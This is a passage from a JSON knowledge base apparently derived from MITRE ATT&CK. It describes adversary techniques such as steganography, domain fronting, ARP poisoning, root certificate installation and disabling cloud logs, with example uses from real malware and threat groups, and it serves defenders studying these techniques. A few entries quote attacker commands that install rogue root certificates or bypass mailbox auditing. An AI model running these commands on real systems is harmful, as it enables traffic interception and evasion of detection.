      "has used image files to hide its loader component.",
      "can extract a malicious Portable Executable (PE) from a photo.",
      "can hide data in images including use of the Least Significant Bit (LSB).",
      "can extract malware from a downloaded JPEG.",
      "payload is encrypted and embedded within its loader or within a legitimate PNG file.",
      "has used .PNG images within a zip file to build the executable.",
      "has hidden encoded data for malware DLLs in a PNG.",
      "has obfuscated its main code routines within bitmap images as part of its anti-analysis techniques.",
      "has used steganography to hide stolen data inside other files stored on Github.",
      "has PE data embedded within JPEG files contained within Word documents.",
      "can hide its payload in BMP images hosted on compromised websites.",
      "has embedded binaries within RC4 encrypted .png files.",
      "can extract a malicious Portable Executable (PE) from a photo.",
      "can use .jpg and .bmp files to store its payload.",
      "has stored obfuscated JavaScript code in an image file named temp.jpg.",
      "can be used to embed a PowerShell script within the pixels of a PNG file.",
      "During   used steganography to hide payloads inside valid images.",
      "used steganography to locate the start of its encoded payload within legitimate 7-Zip code.",
      "can extract backdoor malware from downloaded images.",
      "has hidden malicious executables within PNG files.",
      "has used JPG files with encrypted payloads to mask their backdoor routines and evade detection.",
      "can use steganography to hide C2 information in images.",
      "has used steganography in multiple operations to conceal malicious payloads.",
      "loads a set of PNG images stored in the malware's resources section (RCDATA) each with an encrypted section containing portions of the core  core module. These sections are loaded and decrypted using a bitwise XOR operation with a hardcoded 32 bit key."
    ],
    "description": "Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.[Duqu](https://attack.mitre.org/software/S0038) was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.(Citation: Wikipedia Duqu) By the end of 2017, a threat group usedInvoke-PSImageto hide [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands in an image file (.png) and execute the code on a victim's system. In this particular case the [PowerShell](https://attack.mitre.org/techniques/T1059/001) code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.(Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)  ",
    "similar_words": [
      "Steganography"
    ],
    "id": "T1027.003"
  },
  "attack-pattern--c2f59d25-87fe-44aa-8f83-e8e59d077bf5": {
    "name": "DNS Server",
    "example_uses": [
      "has reconfigured a victim's DNS records to actor-controlled domains and websites.",
      "modified Name Server (NS) items to refer to -controlled DNS servers to provide responses for all DNS lookups."
    ],
    "description": "Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.By compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye DNS Hijack 2019)  Additionally, adversaries may leverage such control in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004) to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications.(Citation: FireEye DNS Hijack 2019)(Citation: Crowdstrike DNS Hijack 2019) Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.(Citation: CiscoAngler)(Citation: Proofpoint Domain Shadowing)",
    "similar_words": [
      "DNS Server"
    ],
    "id": "T1584.002"
  },
  "attack-pattern--c325b232-d5bc-4dde-a3ec-71f3db9e8adc": {
    "name": "Protocol or Service Impersonation",
    "example_uses": [
      "malware also uses a unique form of communication encryption known as FakeTLS that mimics TLS but uses a different encryption method potentially evading SSL traffic inspection/decryption.",
      "uses a cookie named `DSID` to mimic the name of a cookie used by Ivanti Connect Secure appliances for maintaining VPN sessions.",
      "can mimic the HTTP protocol for C2 communication while hiding the actual data in either an HTTP header URI parameter the transaction body or appending it to the URI.",
      "uses a FakeTLS method during C2.",
      "uses custom SSL libraries to impersonate SSL in C2 traffic.",
      "used a FakeTLS session for C2 communications.",
      "has used FakeTLS for session authentication.",
      "generates a false TLS handshake using a public certificate to disguise C2 network communications.",
      "uses FakeTLS to communicate with its C2 server.",
      "can use custom communication methodologies that ride over common protocols including TCP UDP HTTP SMTP and DNS in order to blend with normal network traffic.",
      "masqueraded its network traffic as the Orion Improvement Program (OIP) protocol.",
      "During   frequently configured the URL endpoints of their stealthy passive backdoor LOWKEY.PASSIVE to masquerade as normal web application traffic on an infected server.",
      "can mimic HTTP protocol with custom HTTP verbs HIDE ZVVP and NOP.",
      "has the ability to mimic legitimate services with customized HTTP URL paths and headers to hide malicious traffic.",
      "C2 traffic attempts to evade detection by resembling data generated by legitimate messenger applications such as MSN and Yahoo! messengers. Additionally some variants of  use modified SSL code for communications back to C2 servers making SSL decryption ineffective.",
      "uses fake Transport Layer Security (TLS) to communicate with its C2 server.",
      "mimics HTTP protocol for C2 communication while hiding the actual messages in the Cookie and Set-Cookie headers of the HTTP requests.",
      "can leverage the HTTP protocol for C2 communication while hiding the actual data in either an HTTP header URI parameter the transaction body or appending it to the URI.",
      "leverages the HTTP protocol for C2 communication while hiding the actual messages in the Cookie and Set-Cookie headers of the HTTP requests."
    ],
    "description": "Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  Adversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. Adversaries may also leverage legitimate protocols to impersonate expected web traffic or trusted services. For example, adversaries may manipulate HTTP headers, URI endpoints, SSL certificates, and transmitted data to disguise C2 communications or mimic legitimate services such as Gmail, Google Drive, and Yahoo Messenger.(Citation: ESET Okrum July 2019)(Citation: Malleable-C2-U42)",
    "similar_words": [
      "Protocol Impersonation",
      "Protocol or Service Impersonation"
    ],
    "id": "T1001.003"
  },
  "attack-pattern--c3c8c916-2f3c-4e71-94b2-240bdfc996f0": {
    "name": "Web Session Cookie",
    "example_uses": [
      "During the   used stolen cookies to access cloud resources and a forged `duo-sid` cookie to bypass MFA set on an email account.",
      "has bypassed multi-factor authentication on victim email accounts by using session cookies stolen using EvilGinx."
    ],
    "description": "Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) or [Web Cookies](https://attack.mitre.org/techniques/T1606/001), the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)",
    "similar_words": [
      "Web Session Cookie"
    ],
    "id": "T1550.004"
  },
  "attack-pattern--c3d4bdd9-2cfe-4a80-9d0c-07a29ecdce8f": {
    "name": "Domain Accounts",
    "example_uses": [
      "can use stolen credentials to authenticate on target networks.",
      "During  threat actors used domain accounts to gain further access to victim systems.",
      "For   used stolen administrator credentials for lateral movement on compromised networks.",
      "can use known credentials to run commands and spawn processes as a domain user account.",
      "has used administrator credentials for lateral movement in compromised networks.",
      "During  the threat actors used compromised domain administrator credentials as part of their lateral movement.",
      "has used administrative accounts including Domain Admin to move laterally within a victim network.",
      "has used stolen credentials to access administrative accounts within the domain.",
      "During the   used domain administrators' accounts to help facilitate lateral movement on compromised networks.",
      "can use stolen domain admin accounts to move laterally within a victim domain.",
      "If  cannot access shares using current privileges it attempts access using hard coded domain-specific credentials gathered earlier in the intrusion.",
      "has obtained highly privileged credentials such as domain administrator in order to deploy malware.",
      "has used compromised domain admin credentials to mount local network shares.",
      "has collected credentials from infected systems including domain accounts.",
      "leverages valid accounts after gaining credentials for use within the victim domain.",
      "has used compromised domain accounts to gain access to the target environment.",
      "During  threat actors used domain credentials including domain admin for lateral movement and privilege escalation.",
      "has used stolen domain admin accounts to compromise additional hosts.",
      "actors used compromised domain credentials for the victim's endpoint management platform Altiris to move laterally.",
      "has used legitimate account credentials to move laterally through compromised environments.",
      "has used domain administrator accounts after dumping LSASS process memory.",
      "During  threat actors used compromised VPN accounts for lateral movement on targeted networks.",
      "attempts to access network resources with a domain accounts credentials.",
      "has used compromised domain accounts to authenticate to devices on compromised networks.",
      "attempted to acquire valid credentials for victim environments through various means to enable follow-on lateral movement.",
      "has used valid domain accounts for access.",
      "used multiple mechanisms to capture valid user accounts for victim domains to enable lateral movement and access to additional hosts in victim environments.",
      "During  threat actors used a compromised domain admin account to move laterally.",
      "compromised domain credentials during .",
      "has used an exfiltration tool named STEALHOOK to retreive valid domain credentials.",
      "captured credentials for or impersonated domain administration users."
    ],
    "description": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.(Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or password reuse, allowing access to privileged resources of the domain.",
    "similar_words": [
      "Domain Accounts"
    ],
    "id": "T1078.002"
  },
  "attack-pattern--c48a67ee-b657-45c1-91bf-6cdbe27205f8": {
    "name": "Regsvcs/Regasm",
    "example_uses": [
      "has dropped RegAsm.exe onto systems for performing malicious activity."
    ],
    "description": "Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: [ComRegisterFunction] or [ComUnregisterFunction] respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)",
    "similar_words": [
      "Regsvcs/Regasm"
    ],
    "id": "T1218.009"
  },
  "attack-pattern--c615231b-f253-4f58-9d47-d5b4cbdb6839": {
    "name": "Install Root Certificate",
    "example_uses": [
      "can be used to install browser root certificates as a precursor to performing  between connections to banking websites. Example command: certutil -addstore -f -user ROOT ProgramData\\cert512121.der.",
      "installs a root certificate to aid in  actions using the command add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/filename.",
      "installs a self-generated certificate to the local trust store as a root CA and Trusted Publisher.",
      "can add a certificate to the Windows store."
    ],
    "description": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.(Citation: Operation Emmental)Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability for intercepting information transmitted over secure TLS/SSL communications.(Citation: Kaspersky Superfish)Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.(Citation: SpectorOps Code Signing Dec 2017)In macOS, the Ay MaMi malware uses /usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert to install a malicious certificate as a trusted root certificate into the system keychain.(Citation: objective-see ay mami 2018)",
    "similar_words": [
      "Install Root Certificate"
    ],
    "id": "T1553.004"
  },
  "attack-pattern--c63a348e-ffc2-486a-b9d9-d7f11ec54d99": {
    "name": "Network Logon Script",
    "example_uses": [],
    "description": "Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.(Citation: Petri Logon Script AD) These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.   Adversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",
    "similar_words": [
      "Network Logon Script"
    ],
    "id": "T1037.003"
  },
  "attack-pattern--c726e0a2-a57a-4b7b-a973-d0f013246617": {
    "name": "Compile After Delivery",
    "example_uses": [
      "has compiled the source code for a downloader directly on the infected system using the built-in Microsoft.CSharp.CSharpCodeProvider class.",
      "can compile and execute source code sent to the compromised AD FS server via a specific HTTP POST.",
      "has compiled malware delivered to victims as .c files with the GNU Compiler Collection (GCC).",
      "has used the .NET csc.exe tool to compile executables from downloaded C# code.",
      "has used AutoIt to compile the payload and main script into a single executable after delivery.",
      "and its watchdog component are compiled and executed after being delivered to victims as embedded uncompiled source code.",
      "can compile and execute downloaded modules at runtime.",
      "has used the csc.exe tool to compile a C# executable.",
      "includes functionality to retrieve source code and compile locally prior to execution in victim environments.",
      "downloaded source code files from remote addresses then compiled them locally via GCC in victim environments."
    ],
    "description": "Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as ilasm.exe(Citation: ATTACK IQ), csc.exe, or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)",
    "similar_words": [
      "Compile After Delivery"
    ],
    "id": "T1027.004"
  },
  "attack-pattern--c877e33f-1df6-40d6-b1e7-ce70f16f4979": {
    "name": "System Location Discovery",
    "example_uses": [
      "can identity the OS locale of a compromised host.",
      "has identified the country location of a compromised host.",
      "queries system locale information during execution. Later versions of  query GetSystemDefaultLCID for locale information to determine if the malware is executing in Russian-speaking countries.",
      "can use IP-based geolocation to limit infections to victims in North America Europe and a small number of Asian-Pacific nations.",
      "can determine the country a victim host is located in.",
      "can collected the country code of a compromised machine.",
      "Before executing malicious code  checks the Windows API GetLocaleInfoW and doesn't encrypt files if it finds a former Soviet country.",
      "can identify the geographical location of a victim host.",
      "has conducted system locale checks to see if the compromised host is in Russia Ukraine Belarus Armenia Kazakhstan or Moldova.",
      "can identify the country code on a compromised host.",
      "does not run any tasks or install additional malware if the victim machine is based in Russia.",
      "can use IP geolocation to determine if the person browsing to a compromised site is within a targeted territory such as the US Canada Germany and South Korea.",
      "can determine the geographical location of a victim host by checking the language.",
      "collects the `Locale Name` of the infected device via `GetUserDefaultLocaleName` to determine whether the string `ru` is included but in analyzed samples no action is taken if present.",
      "has obtained the victim's system current location."
    ],
    "description": "Adversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from [System Location Discovery](https://attack.mitre.org/techniques/T1614) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Adversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings.(Citation: FBI Ragnar Locker 2020)(Citation: Sophos Geolocation 2016)(Citation: Bleepingcomputer RAT malware 2020) Windows API functions such as GetLocaleInfoW can also be used to determine the locale of the host.(Citation: FBI Ragnar Locker 2020) In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.(Citation: AWS Instance Identity Documents)(Citation: Microsoft Azure Instance Metadata 2021)Adversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.(Citation: Securelist Trasparent Tribe 2020)(Citation: Sophos Geolocation 2016)",
    "similar_words": [
      "System Location Discovery"
    ],
    "id": "T1614"
  },
  "attack-pattern--c898c4b5-bf36-4e6e-a4ad-5b8c4c13e35b": {
    "name": "VBA Stomping",
    "example_uses": [],
    "description": "Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.(Citation: FireEye VBA stomp Feb 2020)MS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a PerformanceCache that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the _VBA_PROJECT stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.(Citation: Evil Clippy May 2019)(Citation: Microsoft _VBA_PROJECT Stream)An adversary may hide malicious VBA code by overwriting the VBA source code location with zeros, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the _VBA_PROJECT stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.(Citation: Walmart Roberts Oct 2018)(Citation: FireEye VBA stomp Feb 2020)(Citation: pcodedmp Bontchev)",
    "similar_words": [
      "VBA Stomping"
    ],
    "id": "T1564.007"
  },
  "attack-pattern--c92e3d68-2349-49e4-a341-7edca2deff96": {
    "name": "MSBuild",
    "example_uses": [
      "A version of  loads as shellcode within a .NET Framework project using msbuild.exe presumably to bypass application control techniques.",
      "can use built-in modules to abuse trusted utilities like MSBuild.exe.",
      "During  the threat actors used MSbuild to execute an actor-created file."
    ],
    "description": "Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.(Citation: MSDN MSBuild)Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.(Citation: MSDN MSBuild)(Citation: Microsoft MSBuild Inline Tasks 2017) MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.(Citation: LOLBAS Msbuild)",
    "similar_words": [
      "MSBuild"
    ],
    "id": "T1127.001"
  },
  "attack-pattern--c9e0c59e-162e-40a4-b8b1-78fab4329ada": {
    "name": "Impersonation",
    "example_uses": [
      "has called victims' help desk and impersonated legitimate users with previously gathered information in order to gain access to privileged accounts.",
      "During   impersonated HR hiring personnel through LinkedIn messages and conducted interviews with victims in order to deceive them into downloading malware.",
      "During   impersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools.",
      "During   impersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools. utilized social engineering to compel IT help desk personnel to reset passwords and MFA tokens.",
      "has impersonated government and related entities in both phishing activity and developing web sites with malicious links that mimic legitimate resources.",
      "impersonated an employee at a video game developer company to send phishing emails.",
      "creates a network listener using the misspelled label logincontroll recorded to the Registry key HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\NetworkProvider\\\\Order.",
      "impersonates help desk and IT support personnel for phishing and social engineering purposes during initial access to victim environments.",
      "has impersonated legitimate people in phishing emails to gain credentials.",
      "has impersonated academic institutions and NGOs in order to gain information related to North Korea."
    ],
    "description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversarys ultimate goals, possibly against multiple victims.  In many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).Adversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversarys goal.  Impersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.(Citation: CrowdStrike-BEC) There is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) targeting one organization which can then be used to support impersonation against other entities.(Citation: VEC)",
    "similar_words": [
      "Impersonation"
    ],
    "id": "T1656"
  },
  "attack-pattern--ca00366b-83a1-4c7b-a0ce-8ff950a7c87f": {
    "name": "Modify Cloud Compute Configurations",
    "example_uses": [],
    "description": "Adversaries may modify settings that directly affect the size, locations, and resources available to cloud compute infrastructure in order to evade defenses. These settings may include service quotas, subscription associations, tenant-wide policies, or other configurations that impact available compute. Such modifications may allow adversaries to abuse the victims compute resources to achieve their goals, potentially without affecting the execution of running instances and/or revealing their activities to the victim.For example, cloud providers often limit customer usage of compute resources via quotas. Customers may request adjustments to these quotas to support increased computing needs, though these adjustments may require approval from the cloud provider. Adversaries who compromise a cloud environment may similarly request quota adjustments in order to support their activities, such as enabling additional [Resource Hijacking](https://attack.mitre.org/techniques/T1496) without raising suspicion by using up a victims entire quota.(Citation: Microsoft Cryptojacking 2023) Adversaries may also increase allowed resource usage by modifying any tenant-wide policies that limit the sizes of deployed virtual machines.(Citation: Microsoft Azure Policy)Adversaries may also modify settings that affect where cloud resources can be deployed, such as enabling [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535). ",
    "similar_words": [
      "Modify Cloud Compute Configurations"
    ],
    "id": "T1578.005"
  },
  "attack-pattern--ca9d3402-ada3-484d-876a-d717bd6e05f2": {
    "name": "Domain Fronting",
    "example_uses": [
      "has the ability to accept a value for HTTP Host Header to enable domain fronting.",
      "has used the meek domain fronting plugin for  to hide the destination of C2 traffic.",
      "uses Domain Fronting to disguise the destination of network traffic as another server that is hosted in the same Content Delivery Network (CDN) as the intended destination.",
      "supports domain fronting via custom request headers.",
      "has used a fronted domain to obfuscate its hard-coded C2 server domain."
    ],
    "description": "Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.",
    "similar_words": [
      "Domain Fronting"
    ],
    "id": "T1090.004"
  },
  "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213": {
    "name": "ARP Cache Poisoning",
    "example_uses": [
      "has used custom tools to facilitate ARP cache poisoning.",
      "has used ARP spoofing to redirect a compromised machine to an actor-controlled website."
    ],
    "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)Adversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)",
    "similar_words": [
      "ARP Cache Poisoning"
    ],
    "id": "T1557.002"
  },
  "attack-pattern--cacc40da-4c9e-462c-80d5-fd70a178b12d": {
    "name": "Disable or Modify Cloud Logs",
    "example_uses": [
      "can disable or otherwise restrict various AWS logging services such as AWS CloudTrail and VPC flow logs.",
      "has disabled Purview Audit on targeted accounts prior to stealing emails from Microsoft 365 tenants."
    ],
    "description": "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality  for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the users license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)",
    "similar_words": [
      "Disable or Modify Cloud Logs"
    ],
    "id": "T1562.008"
  },
  "attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384": {
    "name": "Security Software Discovery",
    "example_uses": [
      "has searched for anti-malware strings and anti-virus processes running on the system.",
      "can search for processes with antivirus and antimalware product names.",
      "has the ability to identify the installed anti-virus product on the compromised host.",
      "During  threat actors used scripts to detect security software.",
      "has used the Windows service winmgmts:\\\\.\\root\\SecurityCenter2 to check installed antivirus products.",
      "collects a list of installed antivirus software from the victims system.",
      "can identify the installed antivirus product on a targeted system.",
      "searches for anti-virus software and firewall products installed on the victims machine using WMI.",
      "uses a loader DLL file to collect AV product names from an infected host.",
      "contains a command to collect information about anti-virus software on the victim.",
      "checks to see if anti-virus anti-spyware or firewall products are installed in the victims environment.",
      "has used malware to identify installed AV and commonly used forensic and malware analysis tools.",
      "has identified security software configurations defensive tools and sensors installed on a compromised system.",
      "has used Registry keys to detect and avoid executing in potential sandboxes.",
      "has checked for a variety of antivirus products.",
      "has used tools to search victim systems for security products such as antivirus and firewall software.",
      "attempts to detect several anti-virus products.",
      "has checked for specific antivirus products on the targets computer including Kaspersky Quick Heal AVG BitDefender Avira Sophos Avast! and ESET.",
      "uses commands such as netsh advfirewall firewall to discover local firewall settings.",
      "can identify the installed antivirus engine.",
      "used a JavaScript backdoor that is capable of collecting a list of the security solutions installed on the victim's machine.",
      "The main  dropper checks whether the victim has an anti-virus product installed. If the installed product is on a predetermined list the dropper will exit.",
      "can search a compromised host to determine if it is running Windows Defender or Kasperky antivirus.",
      "can gather AVs registered in the system.",
      "can check for the Kaspersky Anti-Virus suite.",
      "has detected security tools.",
      "checks for installed security software like antivirus and firewall.",
      "has the ability to identify which anti-virus products firewalls and anti-spyware products are in use.",
      "installer searches the Registry and system to see if specific antivirus tools are installed on the system.",
      "uses WMI to check for anti-virus software installed on the system.",
      "can determine if a compromised host has security products installed.",
      "has the ability to check if /usr/sbin/setenforce exists. This file controls what mode SELinux is in.",
      "identifies security software such as antivirus through the Security module.",
      "checks for the presence of Avast antivirus in the C:\\Program\\Files\\ folder.",
      "can identify specific analytical tools based on running processes.",
      "has the ability to identify installed anti-virus products on a compromised host.",
      "may collect information on the victim's anti-virus software.",
      "During  the threat actors used WMI queries to determine if analysis tools were running on a compromised system.",
      "can collect a list of anti-virus products installed on a machine.",
      "can detect Avast Software Doctor Web Kaspersky AVG ESET and Sophos antivirus programs.",
      "determines if specific antivirus programs are running on an infected host machine.",
      "checks for antimalware solution processes on the system.",
      "has used WMI to identify anti-virus products installed on a victim's machine.",
      "can detect and terminate active security software-related processes on infected systems.",
      "scanned the Program Files directories for a directory with the string Total Security (the installation path of the 360 Total Security antivirus tool).",
      "can check for running processes on the victims machine to look for Kaspersky and Bitdefender antivirus products.",
      "has used malware to check running processes against a hard-coded list of security tools often used by malware researchers.",
      "has checked for AV software as part of its persistence process.",
      "can list installed security products including the Trusteer and Diebold Warsaw GAS Tecnologia online banking protections.",
      "performs checks for various antivirus and security products during installation.",
      "checks for antivirus and forensics software.",
      "has the ability to detect anti-virus products and processes on a compromised host.",
      "has the ability to detect if the infected host is running an anti-virus process.",
      "will attempt to detect anti-virus products during the initial infection.",
